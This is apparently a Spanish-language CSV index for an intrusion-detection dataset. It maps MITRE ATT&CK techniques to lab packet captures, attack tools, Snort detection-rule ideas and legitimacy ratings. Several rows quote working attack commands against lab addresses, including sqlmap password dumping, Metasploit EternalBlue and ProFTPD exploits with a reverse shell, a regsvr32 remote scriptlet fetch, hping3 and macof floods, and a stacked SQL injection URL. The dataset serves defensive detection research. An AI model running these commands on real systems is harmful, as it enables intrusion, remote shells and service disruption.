Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection1_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [3] / 3.8.5,Manual [3] / 3.8.5.4,Manual [3] / 3.8.5.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes1_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection2_[2].pcapng,HTTP,77,76,0,76,76,76,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [2] / 3.1.3.1,Manual [4] / B.28,Manual [2] / 4.1.1.2,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,Defense Evasion,TA0003,BITS Jobs,T1197,-,-,Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo,"BITSADMIN,METASPLOIT",T1197-BITS_Jobs_[5].pcapng,TCP,27,9,2,16,18,16,2,Descarga de Malware previa - T1105,SI,"Regla genérica que detecte la presencia de cadenas en el contenido de los paquetes como ""Microsoft BITS"" y "".exe"", alertando del intento de creación de una tarea BITS",Ejecución de comandos para la creación de una tarea BITS con rastro de red,Manual [5] / 4.3.1,Manual [5] / C.5,Manual [5] / 5.5.2,1,1,0,1,0,1,LV2,El establecimiento de tareas BITS puede considerarse como tráfico legítimo o como ataque,L3,1,1
Initial Access,-,TA0001,Trusted Relationship,T1199,-,-,Uso de una conexión RDP sin proteger para el acceso a un equipo,RDP,T1199-Trusted_relationship_[4].pcapng,RDP,18,3,0,2,2,2,0,-,SI*,"El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza",-,Manual [4] / 3.5,Manual [4] / B.5,Manual [4] / 4.5,1,1,0,1,0,1,LV2,"El uso de una conexión RDP para ganar acceso a un equipo no siempre constituye un ataque, depende del contexto",L3,0,1
Initial Access,-,TA0001,Hardware Additions,T1200,-,-,Adición de Hardware,SSH Server + USB(Simular USB con MV con SO),T1200-Hardware_Additions_[5].pcapng,SSH,3,1,0,1,1,1,0,-,NO,"Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales","Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.",Manual [5] / 4.2.1,Manual [5] / C.6,Manual [5] / 5.3.4,1,1,0,1,0,1,LV1,Añadir un equipo hardware a una red siempre es un ataque,L3,0,0
Execution,-,TA0002,Exploitation for Client Execution,T1203,-,-,Ataque con Botnet,"Ares, Screenshot and key logging",T1203-C2018_[6].pcapng,-,116,112,0,11053,11053,11053,0,-,NO,-,-,Dataset CIC-2018,Dataset CIC-2018,Manual [4] / B.35,1,1,0,1,0,1,LV1,Un ataque con botnet siempre es un ataque,L3,0,1
Execution,-,TA0002,User Execution,T1204,Malicious Link,T1204.001,Enlace malicioso,wget,T1204.001-malicious_link_[3].pcapng,TCP,1,1,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima),Manual [3] / 3.8.17,Manual [3] / 3.8.17.4,Manual [3] / 3.8.17.5,1,1,0,1,0,1,LV2,Un enlace malicioso a veces puede ser considerado como tráfico legítimo dependiendo de las circuntstancias,L3,0,0
Command and Control,"Defense Evasion, Persistence",TA0040,Traffic Signaling,T1205,Port Knocking,T1205.001,Esconder y activar un puerto de forma remota,Knockd,T1205.001-Port_Knocking_[3].pcapng,TCP,5,1,0,1,1,1,0,-,NO,Detección por anomalías en base a una actividad sospechosa en un puerto concreto,"Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000",Manual [3] / 3.8.11,Manual [3] / 3.8.11.4,Manual [3] / 3.8.11.5,1,1,0,1,0,1,LV1,El Port Knocking siempre se considera un ataque,L3,0,0
Defense Evasion,-,TA0005,Rogue Domain Controller,T1207,-,-,DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory,mimikazt,T1207-Rogue_domain_controller_[4].pcapng,DCERPC,88,1,0,1,1,1,0,-,SI,"Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5), o un intento de aprovechamiento de una vulnerabilidad de la misma",-,Manual [4] / 3.10,Manual [4] / B.10,Manual [4] / 4.10,1,1,0,1,0,1,LV1,El registro de un DC fraudulento para habilitar la manipulación de datos siempre es un ataque (aunque las tareas realizadas posteriormente puedan realizarse también en un entorno legítimo),L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,EternalBlue,Metasploit,T1210-Eternal_blue_[2].pcapng,SMB,24,2,0,2,2,2,0,-,SI,Regla genérica que detecte uso de EternalBlue,"Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""",Manual [2] / 3.1.7.1,Manual [4] / B.29,Manual [2] / 4.1.1.4,1,1,0,1,0,1,LV1,El aprovechamiento de vulnerabilidades en el servicio SMB para realizar diferentes tareas maliciosas siempre constituye un ataque,L3,1,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ejecución de código remoto basado en vulnerabilidades de servidor FTP,Metasploit,T1210-Remote_code_execution_[2].pcapng,FTP,3,1,0,4,4,4,0,-,SI,Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP,"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""",Manual [2] / 3.1.7.2,Manual [4] / B.30,Manual [2] / 4.2.1.9,1,1,0,1,0,1,LV1,La ejecución de código remoto aprovechando vulnerabilidades en el servidor FTP siempre es un ataque,L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ataque Web,"DVWA, In-house selenium framework",T1210-Web_attack-C2018_[6].pcapng,HTTP,260,236,0,1,1,1,0,-,NO,-,-,Dataset CIC-2018,Manual [4] / B.36,Dataset CIC-2018,1,1,0,1,0,1,LV1,Un ataque web siempre es considerado como tal,L3,0,0
Collection,-,TA0009,Data from Information Repositories,T1213,-,-,Inyección SQL,Sqlmap,T1213-SQL_inyection_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte una inyección SQL en la URL de acceso a una página web,Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla,Manual [3] / 3.8.6,Manual [3] / 3.8.6.4,Manual [3] / 3.8.6.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Defense Evasion,-,TA0005,System Binary Proxy Execution,T1218,Regsvr32,T1218.010,Ejecución de COM scriptlet remoto,Regsvr32.exe,T1218.010-COM_Scriptlet_[2].pcapng,TLS,2,1,0,1,1,1,0,-,SI,Regla genérica que detecte un intento de aprovechamiento de la vulnerabilidad del servicio regsvr32 de Windows,Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll,Manual [2] / 3.3.1.1,Manual [5] / C.25,-,1,1,0,1,0,1,LV1,La ejecucion de un scriptlet remoto siempre se considera como un ataque,L3,0,1
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareLocal_[5].pcapng,UDP,2,1,0,1,1,1,0,-,SI,"Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...). En su defecto, Deteccion por listas negras/anomalías.",Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,0,1
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareNAT_[5].pcapng,TCP,145,1,0,8,8,8,0,-,SI,Regla genérica que detecte el uso de la herramienta TeamViewer para obtener el control del software víctima de forma remota,Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,1,1
Defense Evasion,-,TA0005,Template Injection,T1221,-,-,Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido,Sitios web convencionales (Gmail),T1221-Template_Injection_[5].pcapng,-,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,"Regla genérica que detecte la inyección de macros o plantillas para llevar a cabo un ataque de Phishing, usando como medio mecanismos convencionales de comunicación (mensajes SMTP, por ejemplo)","Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima",Manual [5] / 4.4.1,Manual [5] / C.8,Manual [5] / 5.6.5,1,1,0,1,0,1,LV2,El tráfico puede parecer ser legítimo en una inyección de plantilalas (.DOTM),L3,1,1
Discovery,-,TA0007,Domain Trust Discovery,T1482,-,-,Descubrimiento de dominios de confianza en entorno Active Directory,dsquery,T1482-Domain_trust_discovery_[4].pcapng,LDAP,4,1,0,1,1,1,0,-,NO*,"Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain",-,Manual [4] / 3.13,Manual [4] / B.13,Manual [4] / 4.13,1,1,0,1,0,1,LV2,El descubrimiento de dominios de confianza puede ser una actividad legítima,L3,1,0
Impact,-,TA0040,Defacement,T1491,Internal Defacement,T1491.001,Modificar fondo de pantalla equipo victima,PowerShell,T1491.001-Internal_Defacement_[5].pcapng,TCP,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detectable por listas negras/anomalías,Modificar fondo de pantalla equipo victima,Manual [5] / 4.10.1,Manual [5] / C.9,Manual [5] / 5.13.1,1,1,0,1,0,1,LV2,Esta acción puede considerarse tráfico legítimo,L3,1,0
Impact,-,TA0040,Resource Hijacking,T1496,-,-,Descarga y puesta en marcha de software de criptominado,XMRIG,T1496-Cryptomining_[2].pcapng,-,13,1,0,1,1,1,0,-,NO,Detección por anomalías,Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz,Manual [2] / 3.3.2.1,Manual [5] / C.26,Manual [2] / 4.2.2.3,1,1,0,1,0,1,LV1,El uso de un software de criptominado siempre se considera como un ataque,L3,1,0
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Amplificación DNS,dnsdrdos,T1498-Amplif_dns_[1].pcapng,DNS,5180,5173,1,5173,5173,5173,0,,SI,Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida,-,Manual [1] / 3.5.1,Manual [1] / E.14,Manual [4] / 4.1.35 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Siempre se considera como ataque la amplificacion DNS,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Fraggle,hping3,T1498-Fraggle_[1].pcapng,Chargen,1426,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad",-,Manual [1] / 3.4.5,Manual [1] / E.13,Manual [4] / 4.1.36 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Smurf,hping3,T1498-Smurf_[1].pcapng,ICMP,4,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de respuestas ICMP,-,Manual [1] / 3.3.1,Manual [1] / E.7,Manual [4] / 4.1.37 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,-,-,Inundación de TCBPDU,yersinia,T1498-Tcbpdu_[1].pcapng,STP,57229,1,0,1,1,1,0,-,NO,Fuera del alcance del estudio,-,Manual [1] / 3.2.2,Manual [1] / E.5,Manual [4] / 4.1.38 y Manual [5] / 5.13.3,1,0,0,1,1,1,LV1,Un ataque de inundación siempre se considera como tal,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación HTTP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-HTTP_flood-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes HTTP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación tabla MAC,Macof,T1498.001-MAC_table_flood_[3].pcapng,IPv4,1,1,0,1,1,1,0,-,NO,-,Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1,Manual [3] / 3.8.18,Manual [5] / C.27,Manual [3] / 3.18.5 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación TCP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-TCP_flood-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes TCP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Caldera, hping3",T1498.001-UDP_flood_[2].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2,Manual [2] / 3.1.10.2,Manual [2],Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_1-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_2-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Inundación DHCP / Inanición,"DHCPig, yersinia",T1499-Dhcp_flood_[1].pcapng,DHCP,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)",-,Manual [1] / 2.4.2.1.1,Manual [1] / E.18,Manual [4] / 4.1.39 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,El aagotamiento del pool de direcciones de un servidor DHCP siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,LAND,hping3,T1499-Land_[1].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos,-,Manual [1] / 2.3.1.1.5,Manual [1] / E.11,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application or System Exploitation,T1499.004,Suplantación MAC,ip,T1499-Mac_spoof_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1],Manual [1] / E.2,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,La suplantacion MAC siempre se considera como un ataque,L2 (Switch),0,0
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reflexión SYN-ACK,hping3,T1499-Reflexion_synack_[1].pcapng,TCP,953,952,0,952,952,952,0,-,SI,Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger,-,Manual [1] / 3.4.2,Manual [1] / E.10,Manual [5] / 5.13.2,1,1,0,1,0,0,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reseteo de Conexión,"ettercap, netwox, nping",T1499-Reseteo_[1].pcapng,TCP,3,1,0,1,1,1,0,-,NO,Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas,-,Manual [1] / 2.3.1.1.6,Manual [1] / E.12,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Inundación SYN con suplantación,hping3,T1499-Syn_suplantacion_[1].pcapng,TCP,2334,2332,0,2332,2332,2332,0,-,SI,Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas),-,Manual [1] / 2.3.1.1.3,Manual [1] / E.9,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Denegación de servicio a servidor web,Metasploit,T1499.001-OS_Exhaustion_Flood_[3].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el uso de Slowloris para realizar ataque DDos mediante la comprobación de campos de bytes típicos de la herramienta,Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris,Manual [3] / 3.8.16,Manual [3] / 3.8.16.4,Manual [3] / 3.8.16.5 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP a baja tasa,Slowhttptest,T1499.02-Slowhttptest-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP a baja tasa,Uso de Slowhttptest para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP parciales,Slowloris,T1499.02-Slowloris-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris,Uso de Slowloris para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,GoldenEye,T1499.03-GoldenEye-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de GoldenEye para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,Hulk,T1499.03-Hulk-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de Hulk para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,SQL Stored Procedures,T1505.001,Inyección SQL,None (SQL injection using URL),T1505.001-SQL_inyection_[3].pcapng,HTTP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un intento de inyección SQL insertada en la URL de acceso a una página web, o en su defecto en algunos de los campos de las peticiones","""Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)""",Manual [3] / 3.8.7,Manual [3] / 3.8.7.4 y Manual [5] / C.30,Manual [3] / 3.8.7.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,Web Shell,T1505.003,Shell Web,Metasploit,T1505.005-Shell_Web_[2].pcapng,HTTP,3,1,0,1,1,1,0,-,SI,Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.,"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web",Manual [2] / 3.1.5.1,Manual [5] / C.31,-,1,1,0,1,0,1,LV1,La creación de un Shell Remoto haciendo uso de una conexión web siempre es un ataque,L3,1,1
Lateral Movement,-,TA0008,Internal Spear-phishing,T1534,-,-,Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado,"MailEnabler, Thunderbird",T1534-Internal_spearphishing_[4].pcapng,SMTP,10,1,0,1,1,1,0,-,NO,"Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc",-,Manual [4] / 3.14,Manual [4] / B.14,Manual [4] / 4.14,1,1,0,1,0,1,LV2,"El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,0,0
Exfiltration,-,TA0010,Transfer Data to Cloud Account,T1537,-,-,Transferir archivos de una cuenta a otra mediante un servicio en la nube,OneDrive,T1537-Transfer_Data_to_Cloud_Account_[5].pcapng,TCP,76,2,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Transferir entre dos cuentas en la nube unos ficheros,Manual [5] / 4.9.2,Manual [5] / C.10,Manual [5] / 5.12.6,1,1,0,1,0,1,LV2,Transferir datos a la nube puede considerarse tráfico legítimo o ataque dependiendo de las circunstancias,L3,1,1
Persistence,Defense Evasion,TA0003,Pre-OS Boot,T1542,TFTP Boot,T1542.005,Modificación de imagen de SO mediante la suplantación de un Server TFTP,SSH,T1542.005-TFTP_Boot_[5].pcapng,TFTP,17,1,0,1,1,1,0,-,NO***,**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS,Servidor TFTP utilizando Iventoy,Manual [5] / 4.3.2,Manual [5] / C.11,Manual [5] / 5.5.3,1,1,0,1,0,1,LV1,El arranque mediante TFTP desde otro servidor TFTP siempre se considera como un ataque,L3,1,0
Persistence,Privilege Escalation,TA0003,Create or Modify System Process,T1543,Windows Service,T1543.003,Creación o modificación de servicio de Windows para garantizar la persistencia,Metasploit,T1543.003-CreateSystemProcessWindowsService_[5].pcapng,TCP,3,1,1,1,3,1,2,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detección por anomalías,Crear servicio Windows para garantizar persistencia,Manual [5] / 4.3.4,Manual [5] / C.43,Manual [5] / 5.5.6,1,1,0,1,0,1,LV2,La creacion de un servicio de Windows puede considerarse como tráfico legítimo pero tambien como un ataque dependiendo. Esta accion podria realizarla un administrador de red o un atacante,L3,1,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Suplantación ARP,arpspoof,T1557-Arp_spoof_[1].pcapng,ARP,2,1,0,1,1,1,0,-,SI*,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 3.2,Manual [1] / E.3,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion ARP siempre es un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,DHCP Spoofing,T1557.003,DHCP Spoofing,"DHCPig, servidor DHCP",T1557-Dhcp_spoofing_[1].pcapng,DHCP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red",-,Manual [1] / 2.4.2.1.2,Manual [1] / E.19,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,DHCP Spoof siempre se considera como un ataque,L3,0,1
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Agujero 196,ettercap,T1557-Hole196_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 2.1.2.1.1,Manual [1] / E.28,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,Un ataque de agujero 196 siempre se considera como un ataque,L2 (Switch),0,0
